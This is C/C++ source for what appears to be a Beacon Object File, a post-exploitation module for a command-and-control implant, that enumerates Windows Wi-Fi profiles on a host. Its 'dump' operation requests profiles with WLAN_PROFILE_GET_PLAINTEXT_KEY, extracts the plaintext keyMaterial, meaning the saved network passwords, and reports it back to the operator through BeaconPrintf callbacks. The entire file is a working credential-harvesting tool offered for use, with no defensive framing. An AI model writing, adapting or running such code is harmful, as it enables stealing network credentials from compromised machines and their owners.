#ifndef UNICODE
#define UNICODE
#endif

#include <general.h>
#include <wlan.h>

// Function to dump a specific WiFi profile
VOID WiFiDumpSingleProfile(HANDLE ClientHandle, const GUID* interfaceGuid, LPCWSTR ProfileName) {
    WCHAR* ProfileXml    = nullptr;
    DWORD  FlagsWl       = WLAN_PROFILE_GET_PLAINTEXT_KEY;
    DWORD  GrantedAccess = 0;

    DWORD Result = WlanGetProfile( ClientHandle, interfaceGuid, ProfileName, nullptr, &ProfileXml, &FlagsWl, &GrantedAccess );

    if ( Result == ERROR_SUCCESS && ProfileXml != nullptr ) {
        BeaconPrintf(CALLBACK_OUTPUT, "Profile: %ls\n", ProfileName);
        BeaconPrintf(CALLBACK_OUTPUT, "XML: %ls\n", ProfileXml);
        
        WCHAR* KeyMaterialStart = wcsstr( ProfileXml, L"<keyMaterial>"  );
        WCHAR* KeyMaterialEnd   = wcsstr( ProfileXml, L"</keyMaterial>" );
        
        if ( KeyMaterialStart && KeyMaterialEnd ) {
            KeyMaterialStart += 13;
            WCHAR temp = *KeyMaterialEnd;
            *KeyMaterialEnd = L'\0';
            BeaconPrintf(CALLBACK_OUTPUT, "Key Material: %ls\n", KeyMaterialStart);
            *KeyMaterialEnd = temp; 
        }
        
        WCHAR* AuthStart = wcsstr( ProfileXml, L"<authentication>"  );
        WCHAR* AuthEnd   = wcsstr( ProfileXml, L"</authentication>" );
        if ( AuthStart && AuthEnd ) {
            AuthStart += 16;
            WCHAR temp = *AuthEnd;
            *AuthEnd = L'\0';
            BeaconPrintf(CALLBACK_OUTPUT, "Authentication: %ls\n", AuthStart);
            *AuthEnd = temp;
        }
        
        WCHAR* EncStart = wcsstr( ProfileXml, L"<encryption>"  );
        WCHAR* EncEnd   = wcsstr( ProfileXml, L"</encryption>" );
        if ( EncStart && EncEnd ) {
            EncStart += 13;
            WCHAR temp = *EncEnd;
            *EncEnd = L'\0';
            BeaconPrintf(CALLBACK_OUTPUT, "Encryption: %ls\n", EncStart);
            *EncEnd = temp;
        }
        
        BeaconPrintf(CALLBACK_OUTPUT, "----------------------------------------\n");
        WlanFreeMemory( ProfileXml );
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to dump profile '%ls': Error %u\n", ProfileName, Result);
    }
}

VOID WiFiDumpAllProfiles(HANDLE ClientHandle, const GUID* interfaceGuid) {
    PWLAN_PROFILE_INFO_LIST ProfileList = nullptr;
    PWLAN_PROFILE_INFO      Profile     = nullptr;

    INT32 Result = WlanGetProfileList( ClientHandle, interfaceGuid, nullptr, &ProfileList );
    
    if ( Result == ERROR_SUCCESS && ProfileList != nullptr ) {
        BeaconPrintf(CALLBACK_OUTPUT, "Dumping %d profile(s):\n", ProfileList->dwNumberOfItems);
        
        for ( INT32 j = 0; j < ProfileList->dwNumberOfItems; j++) {
            Profile = &ProfileList->ProfileInfo[j];
            WiFiDumpSingleProfile(ClientHandle, interfaceGuid, Profile->strProfileName);
        }
        
        WlanFreeMemory( ProfileList );
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get profile list: Error %u\n", Result);
    }
}

VOID WiFiDumProfile( WCHAR* ProfileName ) {
    HANDLE ClientHandle = nullptr;
    DWORD  MaxClient    = 2;
    DWORD  CurVersion   = 0;
    DWORD  Result       = 0;

    WCHAR GuidString[39] = { 0 };
    
    PWLAN_INTERFACE_INFO_LIST WlanInterfaceList = nullptr;
    PWLAN_INTERFACE_INFO      WlanInterfaceInfo = nullptr;

    Result = WlanOpenHandle( MaxClient, nullptr, &CurVersion, &ClientHandle );
    if (Result != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "WlanOpenHandle failed with error: %u\n", Result);
        return;
    }

    Result = WlanEnumInterfaces( ClientHandle, nullptr, &WlanInterfaceList );
    if (Result != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "WlanEnumInterfaces failed with error: %u\n", Result);
        WlanCloseHandle(ClientHandle, NULL);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Found %d wireless interface(s)\n", WlanInterfaceList->dwNumberOfItems);

    for (DWORD i = 0; i < WlanInterfaceList->dwNumberOfItems; i++) {
        WlanInterfaceInfo = &WlanInterfaceList->InterfaceInfo[i];
        
        INT iRet = StringFromGUID2( WlanInterfaceInfo->InterfaceGuid, GuidString, sizeof(GuidString)/sizeof(*GuidString));
        
        BeaconPrintf(CALLBACK_OUTPUT, "\nInterface %d:\n", i + 1);
        BeaconPrintf(CALLBACK_OUTPUT, "  Description: %ls\n", WlanInterfaceInfo->strInterfaceDescription);
        BeaconPrintf(CALLBACK_OUTPUT, "  GUID: %ls\n", GuidString);
        BeaconPrintf(CALLBACK_OUTPUT, "  State: %d\n", WlanInterfaceInfo->isState);

        if (ProfileName != nullptr && wcslen(ProfileName) > 0) {
            // Dump specific profile
            WiFiDumpSingleProfile(ClientHandle, &WlanInterfaceInfo->InterfaceGuid, ProfileName);
        } else {
            // Dump all profiles for this interface
            WiFiDumpAllProfiles(ClientHandle, &WlanInterfaceInfo->InterfaceGuid);
        }
    }

    if (WlanInterfaceList != NULL) {
        WlanFreeMemory(WlanInterfaceList);
    }
    if (ClientHandle != NULL) {
        WlanCloseHandle(ClientHandle, NULL);
    }
}

VOID WiFiEnumProfiles() {
    HANDLE ClientHandle = nullptr;
    DWORD  MaxClient    = 2;
    DWORD  CurVersion   = 0;
    DWORD  Result       = 0;
    
    PWLAN_INTERFACE_INFO_LIST WlanInterfaceList = nullptr;
    PWLAN_INTERFACE_INFO      WlanInterfaceInfo = nullptr;
    PWLAN_PROFILE_INFO_LIST   ProfileList       = nullptr;
    PWLAN_PROFILE_INFO        Profile           = nullptr;

    Result = WlanOpenHandle( MaxClient, nullptr, &CurVersion, &ClientHandle );
    if (Result != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "WlanOpenHandle failed with error: %u\n", Result);
        return;
    }

    Result = WlanEnumInterfaces( ClientHandle, nullptr, &WlanInterfaceList );
    if (Result != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "WlanEnumInterfaces failed with error: %u\n", Result);
        WlanCloseHandle( ClientHandle, nullptr );
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Found %d wireless interface(s)\n", WlanInterfaceList->dwNumberOfItems);

    for (DWORD i = 0; i < WlanInterfaceList->dwNumberOfItems; i++) {
        WlanInterfaceInfo = &WlanInterfaceList->InterfaceInfo[i];
        
        BeaconPrintf(CALLBACK_OUTPUT, "\nInterface %d: %ls\n", i + 1, WlanInterfaceInfo->strInterfaceDescription);

        Result = WlanGetProfileList( ClientHandle, &WlanInterfaceInfo->InterfaceGuid, nullptr, &ProfileList);
        
        if ( Result == ERROR_SUCCESS ) {
            BeaconPrintf(CALLBACK_OUTPUT, "  Found %d profile(s):\n", ProfileList->dwNumberOfItems);
            
            for ( INT32 j = 0; j < ProfileList->dwNumberOfItems; j++ ) {
                Profile = &ProfileList->ProfileInfo[j];
                BeaconPrintf(CALLBACK_OUTPUT, "    [%d] %ls\n", j + 1, Profile->strProfileName);
            }
            
            WlanFreeMemory( ProfileList );
        } else {
            BeaconPrintf(CALLBACK_ERROR, "  WlanGetProfileList failed with error: %u\n", Result);
        }
    }

    if ( WlanInterfaceList != nullptr ) {
        WlanFreeMemory( WlanInterfaceList );
    }
    if ( ClientHandle != nullptr ) {
        WlanCloseHandle( ClientHandle, nullptr );
    }
}

EXTERN_C VOID go(IN PCHAR Args, IN ULONG Length) {
    datap parser;
    BeaconDataParse(&parser, Args, Length);
    
    WCHAR* operation = (WCHAR*)BeaconDataExtract(&parser, nullptr);
    
    if (operation == nullptr) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: <operation> [profile_name]\n");
        return;
    }
    
    if (wcscmp(operation, L"enum") == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Enumerating WiFi profiles...\n");
        WiFiEnumProfiles();
    }
    else if (wcscmp(operation, L"dump") == 0) {
        WCHAR* profileName = (WCHAR*)BeaconDataExtract(&parser, nullptr);
        if (profileName == NULL || wcslen(profileName) == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "Dumping all WiFi profiles...\n");
            WiFiDumProfile(nullptr); 
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "Dumping WiFi profile: %ls\n", profileName);
            WiFiDumProfile(profileName);
        }
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Unknown operation: %ls\n", operation);
        BeaconPrintf(CALLBACK_ERROR, "Valid operations: enum, dump\n");
    }
}